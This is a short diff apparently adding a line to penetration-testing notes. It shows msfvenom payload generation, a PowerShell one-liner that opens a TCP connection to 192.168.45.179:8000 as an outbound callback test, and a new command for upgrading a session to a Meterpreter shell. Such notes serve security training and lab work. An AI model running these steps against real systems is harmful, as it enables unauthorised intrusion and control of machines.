@@ -966,3 +966,4 @@ msfvenom -f psh-reflection
 ping powershell
 
 $client = New-Object System.Net.Sockets.TcpClient; $client.Connect("192.168.45.179", 8000); $stream = $client.GetStream(); $writer = New-Object System.IO.StreamWriter($stream); $writer.Write("a"); $writer.Flush(); $writer.Close(); $client.Close()
+upgrade shell to meterpreter shell  sessions -u 1
